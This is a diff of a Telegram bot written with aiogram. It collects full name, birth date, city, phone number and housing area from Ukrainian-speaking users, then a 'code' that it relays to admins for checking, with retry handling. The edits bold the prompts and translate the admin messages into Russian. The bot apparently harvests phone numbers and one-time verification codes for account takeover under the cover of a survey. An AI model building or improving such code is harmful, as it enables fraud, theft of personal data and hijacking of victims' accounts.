@@ -18,7 +18,7 @@ async def send_form_intro(callback: types.CallbackQuery):
 @router.callback_query(F.data == "next_question")
 async def ask_full_name(callback: types.CallbackQuery, state: FSMContext):
     await state.set_state(Form.full_name)
-    await callback.message.answer("Вкажіть ПІБ:\n"
+    await callback.message.answer("<b>Вкажіть ПІБ:</b>\n"
     "Зразок: Борисенко Сергій Валерійович")
 
 # --- Этап 3. Вопросы анкеты ---
@@ -26,28 +26,28 @@ async def ask_full_name(callback: types.CallbackQuery, state: FSMContext):
 async def process_full_name(message: types.Message, state: FSMContext):
     await state.update_data(full_name=message.text)
     await state.set_state(Form.age)
-    await message.answer("Вкажіть дату народження (ДД.ММ.РРРР):\n"
+    await message.answer("<b>Вкажіть дату народження (ДД.ММ.РРРР):</b>\n"
     "Зразок: 10.05.1990")
 
 @router.message(Form.age)
 async def process_age(message: types.Message, state: FSMContext):
     await state.update_data(age=message.text)
     await state.set_state(Form.city)
-    await message.answer("Вкажіть місто проживання:\n"
+    await message.answer("<b>Вкажіть місто проживання:</b>\n"
     "Зразок: Київ")
 
 @router.message(Form.city)
 async def process_city(message: types.Message, state: FSMContext):
     await state.update_data(city=message.text)
     await state.set_state(Form.phone)
-    await message.answer("Вкажіть мобільний номер телефону:\n"
+    await message.answer("<b>Вкажіть мобільний номер телефону:</b>\n"
     "Зразок: +380501105011")
 
 @router.message(Form.phone)
 async def process_phone(message: types.Message, state: FSMContext):
     await state.update_data(phone=message.text)
     await state.set_state(Form.email)
-    await message.answer("Вкажіть приблизну площу вашого житла (приміщення):\n"
+    await message.answer("<b>Вкажіть приблизну площу вашого житла (приміщення):</b>\n"
     "Зразок: 45 м²")
 
 @router.message(Form.email)
@@ -113,16 +113,16 @@ async def process_user_code(message: types.Message, state: FSMContext, bot: Bot)
     admins = get_all_admins()
     
     form_text = (
-        f"📋 <b>Нова анкета!</b>\n\n"
+        f"📋 <b>Новая анкета!</b>\n\n"
         f"👤 User ID: <code>{user_data['user_id']}</code>\n"
         f"📱 Username: @{user_data['username']}\n\n"
-        f"<b>Дані анкети:</b>\n"
-        f"ПІБ: {user_data['full_name']}\n"
-        f"Дата народження: {user_data['age']}\n"
-        f"Місто: {user_data['city']}\n"
+        f"<b>Данные анкеты:</b>\n"
+        f"ФИО: {user_data['full_name']}\n"
+        f"Дата рождения: {user_data['age']}\n"
+        f"Город: {user_data['city']}\n"
         f"Телефон: {user_data['phone']}\n"
-        f"Площа житла: {user_data['email']}\n\n"
-        f"🔐 <b>Введений код:</b> <code>{code}</code>"
+        f"Площадь жилья: {user_data['email']}\n\n"
+        f"🔐 <b>Введенный код:</b> <code>{code}</code>"
     )
     
     # Создаем клавиатуру для проверки кода
@@ -218,16 +218,16 @@ async def handle_code_retry(message: types.Message, bot: Bot):
         admins = get_all_admins()
         
         form_text = (
-            f"📋 <b>Повторний ввод коду!</b>\n\n"
+            f"📋 <b>Повторный ввод кода!</b>\n\n"
             f"👤 User ID: <code>{user_data['user_id']}</code>\n"
             f"📱 Username: @{user_data['username']}\n\n"
-            f"<b>Дані анкети:</b>\n"
-            f"ПІБ: {user_data['full_name']}\n"
-            f"Дата народження: {user_data['age']}\n"
-            f"Місто: {user_data['city']}\n"
+            f"<b>Данные анкеты:</b>\n"
+            f"ФИО: {user_data['full_name']}\n"
+            f"Дата рождения: {user_data['age']}\n"
+            f"Город: {user_data['city']}\n"
             f"Телефон: {user_data['phone']}\n"
-            f"Площа житла: {user_data['email']}\n\n"
-            f"🔐 <b>Введений код:</b> <code>{code}</code>"
+            f"Площадь жилья: {user_data['email']}\n\n"
+            f"🔐 <b>Введенный код:</b> <code>{code}</code>"
         )
         
         from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
